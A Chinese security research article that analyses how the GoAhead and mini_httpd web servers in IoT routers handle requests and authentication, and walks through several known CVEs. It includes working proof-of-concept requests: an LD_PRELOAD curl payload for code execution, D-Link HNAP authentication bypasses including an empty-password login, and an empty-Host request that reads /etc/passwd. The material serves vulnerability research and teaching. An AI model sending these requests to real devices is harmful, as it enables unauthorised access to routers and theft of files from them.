---
slug: tiangongarticle024
date: 2024-04-03
title: IoT 设备常见 Web Server 漏洞挖掘思路分析
author: OneShell
tags: [Web Server, GoAhead, mini_httpd, CVE]
---

# IoT 设备常见 Web Server 漏洞挖掘思路分析

## 一、前言

在IoT小设备中由于运行资源（CPU、存储、内存等）受限，通常会使用轻量级的 Web server，例如uHTTPd、lighttpd、micro_httpd、mini_httpd、GoAhead、boa等，其中uHTTPd、lighttpd此类Web server通常不会由开发者修改源码新增功能代码，而是纯粹作为一个类似流量转发的框架；而micro_httpd、mini_httpd、GoAhead、boa此类通常是由开发者将一些业务代码集成到Web server中，导致在server代码中产生漏洞的概率增大。

本文由于篇幅原因，仅仅针对IoT小设备（光猫、路由器、摄像头等）中常见的两个开源Web server框架GoAhead和mini_httpd，分别从源码处理数据、漏洞存在点、经典CVE漏洞分析这三个方面，浅析其漏洞挖掘思路。

本文不会完全分析Web server代码实现、架构，而是聚焦于安全研究较为关注、通常由开发者实现的数据包处理部分。文章的大概阐述思路如下：

1. 首先结合源码说明数据包处理特性，主要涉及鉴权、路由处理
2. 简述数据包处理中可能存在的漏洞点
3. 结合经典漏洞进行分析

<!-- truncate -->

## 二、GoAhead篇

GoAhead是一个轻量化、适用于嵌入式设备的Web server，采用C语言编写，代码量不大，具有高度的可移植性和扩展性。GoAhead支持多进程、多线程，能够处理大量的并发连接，支持SSL/TLS加密和基本的身份认证，支持CGI、ASP，满足了绝大部分的Web server业务场景。

GoAhead由Embedthis Software LLC开发，早年间是完全开源的，可以直接在Github上下载到源码。但是在2022年的时候，似乎转为了商业定制，官方在Github删除了代码库，因此在Github上无法下载，但是在Gitee上还有镜像库。下载地址：[GoAhead: GoAhead WebServer](https://gitee.com/mirrors/GoAhead)

在D-Link的主流路由器中，例如DIR系·列，很多使用了GoAhead作为Web Server；除此之外还有Tenda、NETGEAR、BEC等许多厂家都有在其设备中使用GoAhead。

### 2.1 数据包处理逻辑

GoAhead会对数据包按照优先级进行顺序处理，处理方式是通过注册的回调函数：

* 优先级为1注册的回调函数：所有数据包都需要首先经过该回调函数进行处理，此处也通常被用来做数据包鉴权、请求路径合法性判断、未授权访问路径定义等等；
* 优先级为0注册的回调函数：通常用来定义认证后可访问到的接口逻辑实现；
* 优先级为2注册的回调函数：处理没有匹配到注册路径的数据包，也就是非法路径的数据包。

```c
int websUrlHandlerDefine(char_t *urlPrefix, char_t *webDir, int arg,
    int (*handler)(webs_t wp, char_t *urlPrefix, char_t *webdir, int arg, 
    char_t *url, char_t *path, char_t *query), int flags)
```

重要的参数：

* `char_t *urlPrefix`：指定URL的前缀，也就是需要处理的URL开头部分
* `int (*handler)`：URL对应的回调函数
* `int flags`：URL处理优先级标志，有如下的两个选择：
  * `#define WEBS_HANDLER_FIRST 0x1`：所有的数据包都会通过该回调函数进行处理
  * `#define WEBS_HANDLER_LAST 0x2`：没有回调函数匹配的数据包会通过该回调函数进行处理

如下是一个设备DIR-878，固件版本1.02B02中的GoAhead反编译代码，可以看到GoAhead对于数据包是否已经通过认证，是通过注册一个flags=WEBS_HANDLER_FIRST=1的回调函数websSecurityHandler来进行验证的，这意味着所有的数据包都会通过函数websSecurityHandler进行处理，验证数据包发送者的权限。

```c
websUrlHandlerDefine((int)"/", 0, 0, (int)websSecurityHandler, 1);
websUrlHandlerDefine((int)"/HNAP1/", 0, 0, (int)websFormHandler, 0);
websUrlHandlerDefine((int)"/cgi-bin", 0, 0, (int)websCgiHandler, 0);
websUrlHandlerDefine((int)&unk_497DEC, 0, 0, (int)websDefaultHandler, 2);
```

例如对一个请求的完整处理过程：使用POST请求访问`/HNAP1/`，

1. 首先数据包会进入函数webAuthHandler：请求路径鉴权、请求路径合法性判断等

    ```c
    websUrlHandlerDefine((int)"/", 0, 0, (int)websSecurityHandler, 1);
    ```

2. 根据一层路径`/HNAP1/`，匹配回调函数websFormHandler：

    ```c
    websUrlHandlerDefine((int)"/HNAP1/", 0, 0, (int)websFormHandler, 0);
    ```

3. 然后在回调函数websFormHandler进行进一步的业务代码处理

### 2.2 漏洞挖掘思路

因此，对于GoAhead的漏洞挖掘，一般的思路是：

1. 根据关键字符串定位到GoAhead的版本，看是否收到历史漏洞的影响，其中CVE-2017-17562和CVE-2021-42342都是发生在由于对CGI环境变量处理不当导致的远程代码执行
2. 分析路径鉴权模块，例如websUrlHandlerDefine中对路径鉴权是否存在绕过、缓冲区溢出
3. 分析其他路径定义函数，看路径的回调函数中参数处理是否存在漏洞

根据笔者对GoAhead的处理经验，其一般存在认证后相关的命令注入、缓冲区溢出等常见漏洞，但GoAhead的鉴权是一个比较难绕过的点，使用的鉴权方式越简单、额外判定越少，越难绕过。

### 2.3 案例分析

#### 案例1：GoAhead环境变量注入漏洞（CVE-2017-17562）

> CVE-2017-17562是发生在版本3.6.5之前的远程代码执行，当CGI功能被启用且采用了动态so加载，由于处理环境变量时直接将请求参数键值对设置并传递到CGI，如果使用了LD_PRELOAD，使用POST请求方式可以将代码通过标准输入传递到CGI的/proc/self/fd/0，然后导致远程代码执行。

Goahead的版本号确定，可以通过搜索字符串`GoAhead-Webs`，可以确定版本，从而判断是否受到历史漏洞的影响。

 ![版本字符串定位](/attachments/2024-04-03-iotweb-server/71d4fce9-f626-41a2-9a7e-749853c5c67e.png)

漏洞发生的本质是因为使用了不可信任的HTTP请求参数作为初始化CGI脚本的环境变量。GoAhead调用CGI之前，会使用函数cgiHandler将用户提交的参数存入环境变量数组envp中，并只使用了简单的黑名单过滤REMOTE_HOST和HTTP_AUTHORIZATION两个环境变量。CVE-2021-42342是对补丁的绕过，此处不再详细阐述。

```c
/*
    Add all CGI variables to the environment strings to be passed to the spawned CGI process. This includes a few
    we don't already have in the symbol table, plus all those that are in the vars symbol table. envp will point
    to a walloc'd array of pointers. Each pointer will point to a walloc'd string containing the keyword value pair
    in the form keyword=value. Since we don't know ahead of time how many environment strings there will be the for
    loop includes logic to grow the array size via wrealloc.
    */
envpsize = 64;
envp = walloc(envpsize * sizeof(char*));
for (n = 0, s = hashFirst(wp->vars); s != NULL; s = hashNext(wp->vars, s)) {
    if (s->content.valid && s->content.type == string &&
        strcmp(s->name.value.string, "REMOTE_HOST") != 0 &&
        strcmp(s->name.value.string, "HTTP_AUTHORIZATION") != 0) {
        envp[n++] = sfmt("%s=%s", s->name.value.string, s->content.value.string);
        trace(5, "Env[%d] %s", n, envp[n-1]);
        if (n >= envpsize) {
            envpsize *= 2;
            envp = wrealloc(envp, envpsize * sizeof(char *));
        }
    }
}
*(envp+n) = NULL;
```

对于此漏洞的利用，先补充下CGI调用的相关基础知识。Web server为了增加自身数据处理的可扩展性，会采用CGI（Common Gateway Interface，通用网关接口）标准启动外部程序处理用户的请求，并将外部程序处理数据的结果通过Web server返回给用户。Web server会将用户提交的数据通过环境变量和标准输入传递给程序，程序执行完毕之后通过标准输出传递给Web server，然后Web server再返回给用户。

因此，针对该漏洞的一种利用方式就是通过POST请求头设置环境变量LD_PRELOAD为CGI程序自身的标准输入（即POST请求体），CGI程序运行时就会自动加载请求体中构造的动态链接库。

如下，先定义一个构造函数，该函数会先于CGI程序的main函数被调用。

```c
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "Hello: World!\n", 14);
}
```

使用如下命令构造出动态链接库，使用cat命令测试，的确能够运行。

```plaintext
$ gcc -shared -fPIC ./payload.c -o payload.so
$ LD_PRELOAD=./payload.so cat /dev/null
Hello: World!
```

然后使用curl构造POC如下，发送请求后可以看到的确执行了动态链接库中的函数并输出结果。此处对POC简单解释下，GoAhead调用CGI程序前，会对CGI程序的环境变量和标准输入进行设置。data-binary参数是将payload.so作为CGI程序的标准输入；LD_PRELOAD=/proc/self/fd/0，则是让CGI程序在运行时从自身的标准输入加载动态链接库，也就是POST请求体中传入的payload.so。

```plaintext
$ curl -X POST --data-binary @payload.so http://127.0.0.1/cgi-bin/cgitest\?LD_PRELOAD\=/proc/self/fd/0 -i | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 17602    0  2026  100 15576   171k  1317k --:--:-- --:--:-- --:--:-- 1562k
HTTP/1.1 200 OK
Date: Mon Sep 25 03:01:32 2023
Transfer-Encoding: chunked
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
Pragma: no-cache
Cache-Control: no-cache
Hello:  World!
Content-type: text/html
```

#### 案例2：发生在websSecurityHandler中的认证绕过（CVE-2020-15633）

> 该漏洞是发生在LAN口的一个登录认证绕过漏洞，影响设备DIR-867、DIR-878、DIR-882，固件版本1.20B10_BETA。漏洞产生的原因是在处理HNAP请求的过程中，验证用户登录逻辑时处理不当，使用strstr函数来检查无需验证权限的接口，导致可以构造特定URI来绕过身份认证，从而访问敏感接口。

设备采用lighttpd作为Web server，根据配置会将HNAP请求转发到程序/bin/prog.cgi进行处理，prog.cgi是基于GoAhead开发。在文章开头提到过使用lighttpd作为Web server，将流量根据业务场景通过规则进行转发，此处就是一个典型的示例：将所有HNAP1相关的流量使用fastcgi转发到了/bin/prog.cgi中进行处理，这样使得架构更加模块化、处理逻辑更清晰。

```plaintext
fastcgi.server = ( 
    "/HNAP1/" => 
    ((
    "socket" => "/var/prog.fcgi.socket-0",
    "check-local" => "enable",
    "bin-path" => "/bin/prog.cgi",
    "idle-timeout" => 10,
    "min-procs" => 1,
    "max-procs" => 1
    )), 
    ......
```

漏洞触发过程的函数调用如下：

```plaintext
sub_423ECC -> 0
sub_4249EC -> 0
websSecurityHandler -> 0
```

1. 在函数sub_423ECC中，会使用函数strstr比较环境变量REQUEST_URI（也就是请求路径）中是否含有字符串列表actions_list中的字符串，然后触发到return 0。

    ```c
    if ( a1[57] && strstr(a1[57], &actions_list[32 * index]) )// REQUEST_URI
    {
        if ( strcmp(&actions_list[32 * index], "/HNAP1/") || !a1[50] || strcmp(a1[50], "POST") )
            return 0;
    }
    ```

    actions_list中的字符串表如下：

    ```plaintext
    .data:004D01A0 actions_list:   .ascii "GetCAPTCHAsetting"<0>
    .data:004D01A0                                          # DATA XREF: sub_423ECC+D8↑o
    .data:004D01A0                                          # sub_423ECC+12C↑o ...
    .data:004D01B2                 .align 4
    .data:004D01C0 aGetdevicesetti_3:.ascii "GetDeviceSettings"<0>
    .data:004D01D2                 .align 4
    .data:004D01E0 aBlockedpageHtm:.ascii "blockedPage.html"<0>
    .data:004D01F1                 .align 4
    .data:004D0200 aMobileloginHtm:.ascii "MobileLogin.html"<0>
    .data:004D0211                 .align 4
    .data:004D0220 aLoginHtml:     .ascii "Login.html"<0>
    .data:004D022B                 .align 5
    .data:004D0240 aEulaHtml:      .ascii "EULA.html"<0>
    .data:004D024A                 .align 5
    .data:004D0260 aIndexHtml_2:   .ascii "Index.html"<0>
    .data:004D026B                 .align 5
    .data:004D0280 aWizardHtml:    .ascii "Wizard.html"<0>
    .data:004D028C                 .align 5
    .data:004D02A0 aHnap1_5:       .ascii "/HNAP1/"<0>
    .data:004D02A8                 .align 5
    .data:004D02C0 aEulaTermHtml:  .ascii "EULA_Term.html"<0>
    .data:004D02CF                 .align 5
    .data:004D02E0 aEulaPrivacyHtm:.ascii "EULA_Privacy.html"<0>
    .data:004D02F2                 .align 4
    ```

    ```plaintext
    .data:004D01A0 actions_list:   .ascii "GetCAPTCHAsetting"<0>
    .data:004D01A0                                          # DATA XREF: sub_423ECC+D8↑o
    .data:004D01A0                                          # sub_423ECC+12C↑o ...
    .data:004D01B2                 .align 4
    .data:004D01C0 aGetdevicesetti_3:.ascii "GetDeviceSettings"<0>
    .data:004D01D2                 .align 4
    .data:004D01E0 aBlockedpageHtm:.ascii "blockedPage.html"<0>
    .data:004D01F1                 .align 4
    .data:004D0200 aMobileloginHtm:.ascii "MobileLogin.html"<0>
    .data:004D0211                 .align 4
    .data:004D0220 aLoginHtml:     .ascii "Login.html"<0>
    .data:004D022B                 .align 5
    .data:004D0240 aEulaHtml:      .ascii "EULA.html"<0>
    .data:004D024A                 .align 5
    .data:004D0260 aIndexHtml_2:   .ascii "Index.html"<0>
    .data:004D026B                 .align 5
    .data:004D0280 aWizardHtml:    .ascii "Wizard.html"<0>
    .data:004D028C                 .align 5
    .data:004D02A0 aHnap1_5:       .ascii "/HNAP1/"<0>
    .data:004D02A8                 .align 5
    .data:004D02C0 aEulaTermHtml:  .ascii "EULA_Term.html"<0>
    .data:004D02CF                 .align 5
    .data:004D02E0 aEulaPrivacyHtm:.ascii "EULA_Privacy.html"<0>
    .data:004D02F2                 .align 4
    ```

2. 然后返回到函数sub_4249EC，触发该函数继续返回0；
3. 再返回到函数websSecurityHandler中，使得该认证函数返回0，达到认证绕过；

    ```c
    websUrlHandlerDefine("/", 0, 0, websSecurityHandler, 1);
    ```

综上所述，对于路由/HNAP1/，只需要在uri后添加?GetCAPTCHAsetting或者任意其他字符串列表的中字符串，就可以达到认证绕过访问该接口的目的，参考POC如下：

```plaintext
POST /HNAP1/?Login.html HTTP/1.1
Host: 192.168.0.1
Content-Length: 302
Accept: */*
X-Requested-With: XMLHttpRequest
HNAP_AUTH: 00DAB25BFD3EBF8FAD03E60E5616BF44 1598580346156
SOAPAction: "http://purenetworks.com/HNAP1/GetIPv6Status"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
Content-Type: text/xml; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/Home.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetIPv6Status xmlns="http://purenetworks.com/HNAP1/" /></soap:Body></soap:Envelope>
```

#### 案例3：同样是发生在函数 websSecurityHandler 中的认证绕过（CVE-2020-8864）

> CVE-2020-8864是发生在固件版本为 1.10B04 的 D-Link DIR-867、DIR-878 和 DIR-882 路由器的认证绕过漏洞。该漏洞是由于HNAP请求中处理登录密码时缺乏对空密码的正确处理而导致的，攻击者可以利用该漏洞进行命令执行

此处同样采用固件版本为1.10B02的D-Link DIR 878中的prog.cgi对漏洞进行分析。触发漏洞的函数调用路径如下，比上一个漏洞深入了一层函数调用。

```plaintext
sub_423ECC -> 0
sub_4249EC -> 0
websSecurityHandler -> 0
sub_423304 -> 0
sub_420E7C -> 0
```

在函数sub_423304中会根据请求参数调用不同的函数，当action=login的时候，进入函数hnap_login进行认证处理。

```c
sub_423304 {
    ...
    if ( sub_41E4FC(a1) )
    {
        action = webGetVarString(a1, "/Login/Action");
        if ( action && !strncmp(action, "request", 7) )
        {
            hnap_request(a1);
        }
        else if ( action && !strncmp(action, "login", 5) )
        {
            hnap_login(a1);
        }
        else if ( action && !strncmp(action, "logout", 6) )
        {
            sub_4212D4(a1);
        }
        else
        {
            sub_423524(a1, 3);
        }
        return 1;
    }
    ...
}
```

函数hnap_login是寻常的账号、密码验证流程，大概简化的流程就是先从请求中获取账号、密码，然后比较账号是否为Admin/admin，先获取密码长度然后调用strncmp比较密码是否正确。但是如果输入密码为空则会导致strncmp比较通过。

```c
int __fastcall hnap_login(int a1)
{
    ...
    post_username = webGetVarString(a1, "/Login/Username");
    post_password = webGetVarString(a1, "/Login/LoginPassword");
    if (... || !post_username || !post_password || strncmp(post_username, "Admin", 5) && strncmp(post_username, "admin", 5) )
    {
        goto LOGIN_FAIL;
    }
    ...
    if ( !strcmp(nvram_isDefaultLogin, "1")
        || (len_password = strlen(post_password), !strncmp(v13, post_password, len_password)) )
    {
        ...
        return 0;
    }
    else
    {
LOGIN_FAIL:
        ...
        return 1;
    }
}
```

参考POC构造如下：

```plaintext
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
Content-Length: 
Accept: */*
X-Requested-With: XMLHttpRequest
HNAP_AUTH: 00DAB25BFD3EBF8FAD03E60E5616BF44 1598580346156
SOAPAction: "http://purenetworks.com/HNAP1/"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
Content-Type: text/xml; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/Home.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://purenetworks.com/HNAP1/">
      <Action>login</Action>
      <Username>admin</Username>
      <LoginPassword></LoginPassword>
      <Captcha/><Captcha>
    </Login>
  </soap:Body>
</soap:Envelope>
```

#### 其他认证后的存在的漏洞

GoAhead中由于很多业务代码是通过定义接口+回调函数的形式集成到自身，代码量增多导致发生漏洞的可能增大，如下是一些典型的GoAhead认证后漏洞，包含常见的漏洞缓冲区溢出、命令执行。

* CVE-2021-43474：D-Link DIR 823G中的认证后命令注入
* CVE-2020-10987：Tenda AC15中的认证后命令执行
* CVE-2018-11013：D-Link DIR 816A2中的认证后缓冲区溢出

## 三、mini_httpd篇

mini_httpd是一个小型的HTTP服务器，它的代码非常小巧，仅有几千行代码，其可以在多种操作系统上运行，包括Linux、FreeBSD、Solaris、Windows等。mini_httpd支持动态内容的生成，包括CGI、SSI以及FastCGI，同时它也支持虚拟主机和基本的身份验证，这满足了绝大部分的IoT Web server应用场景，结合其小体量的代码，被广泛应用于嵌入式设备和低功耗系统中。

mini_httpd的代码下载地址：[mini_httpd](https://acme.com/software/mini_httpd/)，目前在NETGEAR的路由器中常见mini_httpd作为Web server。

### 3.1 数据包处理逻辑

mini_httpd收到一个数据请求包后会fork创建一个子进程来进行处理，这种方式如果在高并发场景会在进程创建、销毁过程中消耗大量的资源，但是在并发量低的嵌入式设备已经够用了。

```c
 /* Fork a sub-process to handle the connection. */
 r = fork();
    ...
    if ( r == 0 )
    {
        /* Child process. */
        ...
        handle_request();       // 数据包处理逻辑
    }
    ...
 }
```

子进程中主要是通过handle_request函数来对数据进行处理的，主要是先解析请求行、再解析请求头。

* 读取请求的第一行，获取到请求行，然后从行中解析到请求方法protocol、请求路径path和查询参数query
* 随后解析header，主要实现是通过while循环继续逐行解析header中的字段，包括Authorization、Content-Length、Content-Type、Cookie、User-Agent等等常见的字段

如下是handle_request函数中读取请求行，获取到请求method_str、path、query、protocol。

```c
/* Parse the first line of the request. */
method_str = get_request_line();
if ( method_str == (char*) 0 )
    send_error( 400, "Bad Request", "", "Can't parse request." );
path = strpbrk( method_str, " \t\012\015" );
if ( path == (char*) 0 )
    send_error( 400, "Bad Request", "", "Can't parse request." );
*path++ = '\0';
path += strspn( path, " \t\012\015" );
protocol = strpbrk( path, " \t\012\015" );
if ( protocol == (char*) 0 )
    send_error( 400, "Bad Request", "", "Can't parse request." );
*protocol++ = '\0';
protocol += strspn( protocol, " \t\012\015" );
query = strchr( path, '?' );
if ( query == (char*) 0 )
    query = "";
else
    *query++ = '\0';
```

然后是while循环处理header，获取字段。在源码中包括：Authorization、Content-Length、Content-Type、Cookie、Host、If-Modified-Since、Referer、Referrer、User-Agent这些字段。

```c
/* Parse the rest of the request headers. */
while ( ( line = get_request_line() ) != (char*) 0 )
{
    if ( line[0] == '\0' )
        break;
    else if ( strncasecmp( line, "Authorization:", 14 ) == 0 )
    {
        ...
    }
    else if ( strncasecmp( line, "Content-Length:", 15 ) == 0 )
    {
        ...
    }
```

获取到了如上的重要字段后，就开始对数据包的合法性进行判断，例如：

* 请求方法method是否合理：GET、HEAD、POST、PUT、DELETE、TRACE
* 请求路径path必须以反斜杠`/`开头、对path进行目录穿越相关字符进行处理、检查文件是否存在
* 然后根据path是文件夹或文件，分别调用do_dir和do_file进行处理，二者最终都会进行权限检查函数auth_check

在权限检查函数auth_check中，输入为请求的path转换的实际路径file所在的文件夹dirname，如果权限检查通过，则继续直接随后的数据包处理流程；如果权限检查是否，则通过send_authenticate函数返回401，然后结束当前连接的生命周期。

权限检查的流程则是：

1. 如果dirname中没有.htpasswd文件，那么直接认证通过。就相当于是在需要授权访问的文件夹中添加该文件，不需要授权访问的文件夹中没有该文件
2. 源码中采用的校验方式是BASIC认证，请求包中带上username和base64编码的password，然后和.htpasswd文件中保存的账号信息进行对比，如果比较通过则直接返回。

### 3.2 漏洞挖掘思路

因此，平常漏洞挖掘中比较关心的登录认证流程就非常清晰：main -> handle_request -> do_file/do_dir -> auth_check。一般情况下，厂商会根据自己的业务逻辑修改相关的函数，但是根据源码我们还是能通过一些字符串特征来定位到关键函数，例如：

* 通过搜索index相关的页面字符串，可以定位到handle_request

```plaintext
.data:0041E030 index_names:    .word aSetupCgi          # DATA XREF: handle_request+38↑o
.data:0041E030                                          # "setup.cgi"
.data:0041E034                 .word aIndexHtml         # "index.html"
.data:0041E038                 .word aIndexHtm          # "index.htm"
.data:0041E03C                 .word aIndexXhtml        # "index.xhtml"
.data:0041E040                 .word aIndexXht          # "index.xht"
.data:0041E044                 .word aDefaultHtm        # "Default.htm"
```

* 函数handle_request中的逻辑是由开发者定义，因此可能发生缓冲区溢出、命令注入等常见漏洞形式
* 通过搜索字符串.htpasswd可以直接定位到do_file、auth_check函数。do_file函数中会检查请求文件是否为.htpasswd，auth_check函数则是需要读取账号信息、调用字符串比较函数等

除此之外，mini_httpd 1.30之前的版本存在一个任意文件读取漏洞CVE-2018-18778，当设备开启虚拟主机模式的时候，可以通过构造空的HOST请求头和想要读取的文件作为请求资源，便能任意文件读取，随后将从源码简单分析漏洞原理。

总之，mini_httpd主要容易发生漏洞的地方就是在处理数据包的函数handle_request处，因为此处是开发者主要添加自己代码的地方，例如对header的处理、认证的自我实现方式等等。

### 3.3 案例分析

#### 案例1：mini_httpd任意文件读取漏洞（CVE-2018-18778）

> CVE-2018-18778是mini_httpd自身的一个任意文件读取漏洞，1.30（最新版本）之前的版本都会收到影响。在mini_httpd开启虚拟主机模式的情况下，用户请求 `http://HOST/FILE将会访问到当前目录下的HOST/FILE文件`。

漏洞发生在数据包处理函数handle_request中。当处理完毕请求头后，获取到请求文件path，并根据请求文件path构造实际在磁盘中的文件路径file。

```c
handle_request(void) {
    ...
    strdecode( path, path );
    if ( path[0] != '/' )
        send_error( 400, "Bad Request", "", "Bad filename." );
    file = &(path[1]);
    de_dotdot( file );
    if ( file[0] == '\0' )
        file = "./";
    if ( file[0] == '/' ||
            ( file[0] == '.' && file[1] == '.' &&
            ( file[2] == '\0' || file[2] == '/' ) ) )
        send_error( 400, "Bad Request", "", "Illegal filename." );
    if ( vhost ) // 开启虚拟主机模式
        file = virtual_file( file );
    ...
}
```

当设备开启虚拟主机模式的情况下，调用函数virtual_file进行处理。该函数中使用了snprintf构造路径，而且没有对参数f进行校验，因此当req_home如果等于空，那么就相当于直接访问请求文件路径f了。

```c
static char* virtual_file( char* f ) {
    char* cp;
    static char vfile[10000];

    /* Use the request's hostname, or fall back on the IP address. */
    if ( host != (char*) 0 )
        req_hostname = host;
    else
    {
        usockaddr usa;
        socklen_t sz = sizeof(usa);
        if ( getsockname( conn_fd, &usa.sa, &sz ) < 0 )
            req_hostname = "UNKNOWN_HOST";
        else
            req_hostname = ntoa( &usa );
    }
    /* Pound it to lower case. */
    for ( cp = req_hostname; *cp != '\0'; ++cp )
        if ( isupper( *cp ) )
            *cp = tolower( *cp );
    (void) snprintf( vfile, sizeof(vfile), "%s/%s", req_hostname, f );
    return vfile;
}
```

此处补充下关于虚拟主机相关的概念。虚拟主机（Virtual Hosting）模式是Web服务器配置的一种方式，它允许服务器在同一物理服务器上托管多个网站域名。在虚拟主机模式下，Web服务器在收到HTTP请求时会检查请求的Host头部，根据这个头部确定请求意图访问的是哪个虚拟主机。也就是说，攻击者可以向存在漏洞的mini_httpd发送HOST为空的请求头，并将想要读取的文件放在请求行的路径中，如下：

```plaintext
GET /etc/passwd HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

在mini_httpd 1.30版本中，对该漏洞进行了修补，大概就是在函数handle_request处理请求头的时候对HOST新增了一个检查，检查HOST是否为空，如果为空则同样返回400错误。

```c
// 1.29
 else if ( strncasecmp( line, "Host:", 5 ) == 0 )
{
    cp = &line[5];
    cp += strspn( cp, " \t" );
    host = cp;
    if ( strchr( host, '/' ) != (char*) 0 || host[0] == '.' )
    send_error( 400, "Bad Request", "", "Can't parse request." );
}

// 1.30
 else if ( strncasecmp( line, "Host:", 5 ) == 0 )
{
    cp = &line[5];
    cp += strspn( cp, " \t" );
    host = cp;
    if ( host[0] == '\0' || host[0] == '.' ||
           strchr( host, '/' ) != (char*) 0 )
        send_error( 400, "Bad Request", "", "Can't parse request." );
}
```

#### 案例2：发生在函数auth_check中的认证绕过（**CVE-2021-35973）**

> 发生在netgear wac104设备、固件版本1.0.4.15之前的身份认证绕过漏洞，漏洞产生的原因是在鉴权过程中，使用了strstr来判断：如果请求uri中包含currentsetting.htm，设置无需认证标志。因此攻击者可以在需要鉴权的uri中包含currentsetting.htm标志，从而达到认证绕过的目的。

通过之前的源代码梳理，也明白了mini_httpd的登录认证流程，那么可以通过搜索字符串的技巧直接定位到auth_check函数。auth_check函数开头有一段导致后续认证绕过的逻辑，其中有一个g_bypass_flag=1时可以直接通过认证。

```c
if ( g_bypass_flag == 1 )
{
    if ( !sub_4062C0() )
    {
        system("/bin/echo genie from wan, drop request > /dev/console");
        exit(0);
    }
    result = system("/bin/echo genie from lan, ok > /dev/console");
}
else {
    ......
}
```

查看变量g_bypass_flag的交叉引用，赋值的地方一共包含如下的三处：

1. 当请求path中包含currentsetting.htm的时候

    ```c
    if ( strstr(v86, "currentsetting.htm") )
        g_bypass_flag = 1;
    ```

2. SOAPAction相关，设计的初衷应该是可以访问任意SOAP的xml。

    ```c
        else
        {
            v26 = strncasecmp(v34, "Accept-Language:", 16);
            v27 = v34;
            if ( v26 )
            {
                v30 = v34 + 11;
                if ( !strncasecmp(v27, "SOAPAction:", 11) )
                {
                v31 = strspn(v30, " \t");
                v32 = strcasestr(&v30[v31], "urn:NETGEAR-ROUTER:service:");
                ......
                if ( v32 )
                {
                    ......
                    g_bypass_flag = 1;
                }
                }
            }
    ```

3. 请求path中包含setupwizard.cgi，但是随后的处理逻辑会调用exit退出，因此无法利用。这个可能是当设备首次启动、开始安装向导触发的。

    ```c
    if ( strstr((const char *)g_path, "setupwizard.cgi") )
        g_bypass_flag = 1;
    ```

再次返回到mini_httpd的源代码中，结合固件中的反汇编

* 首先通过查找method后的第一个空格、换行、制表符的方式，获取到path。但是随后没有对path中是否包含%00进行判断。

```c
v10 = strpbrk(v8, " \t\n\r");
g_path = v10;
```

* 获取到的path在内存中大概是：`uri\0currentsetting.htm`，这导致，strstr函数返回一个非空值，就设置了g_bypass_flag，从而通过了auth_check

```c
......
v86 = (const char *)g_path;
......
if ( strstr(v86, "currentsetting.htm") )
    g_bypass_flag = 1;
......
```

#### 案例3：发生在函数handle_request（CVE-2021-34979）

> 发生在NETGEAR R6260，固件版本V1.1.0.78_1.0.1中，处理`SOAPAction`标头由于未判断全局数组`spapServiceName`的边界，导致越界写。写入的数据会以环境变量的形式传递到setupwizard.cgi中，进而造成缓冲区溢出。

越界写：发生在处理数据包的函数`handle_request`中，未判断边界。

```c
else if (strncasecmp(line, "SOAPAction:", 11) == 0)
{
    char *pTemp = NULL;
    cp = &line[11];
    cp += strspn(cp, " \t");
    pTemp = strcasestr(cp, "urn:NETGEAR-ROUTER:service:");
    if (pTemp != NULL)
    {
        int i = 0;
        pTemp += strlen("urn:NETGEAR-ROUTER:service:");
        while (*pTemp != ':' && *pTemp != '\0')
        {
            soapServiceName[i++] = *pTemp;              // <-- Out-Of-Bounds Write
            pTemp++;
        }
    }
}
```

后续调用setupwizard.cgi时，环境变量会传入，并且造成缓冲区溢出。

```c
bool check_soap_login_record()
{
    ... 
    v1 = getenv("SOAP_LOGIN_TOKEN");
    ...
    if ( !v3 )  
    {
        ...
        strcat((char *)v25, v1);
        ...
```

## 四、总结

本文选取了GoAhead和mini_httpd两个IoT小设备中常见的Web server，结合源代码和经典CVE对其漏洞挖掘思路进行浅析。但是实际的漏洞挖掘过程中，可能开发者会对Web server的代码结合实际业务场景进行较大的改动，本文的浅显思路仅仅作为简单参考。

本文的漏洞示例基本上都是分析了server自身存在的漏洞以及认证时可能存在的漏洞，因为认证后相关的漏洞和设备的具体业务代码相关，和server原生的代码结构相关行不高。回想刚开始挖小设备漏洞的时候，都是先找一些关键字符串、然后交叉引用找调用函数、调用函数再一层层交叉引用查看，这个逻辑对于找认证后漏洞是可以的，但是如果想要找到认证前相关的漏洞，就要对server自身的代码结构有一定的了解，这样才能快速、精确定位到可能的漏洞点处。

进一步展开的话，对于GoAhead、mini_httpd此类集成业务代码的Web server，分析其数据包处理流程、鉴权处理流程对于漏洞自动化挖掘也是非常有帮助的，例如：

* 当开发者去除掉server的函数符号时，我们也可以根据函数调用图特征、关键字符串特征等快速判定具体是哪个开源server、版本是什么，进一步找到源代码为逆向分析提供帮助
* 在静态分析的时候，确定好数据包的source点、鉴权函数路径、可能存在漏洞的sink点，通过污点快播快速判断指定Web server是否可能存在认证前的某些漏洞。
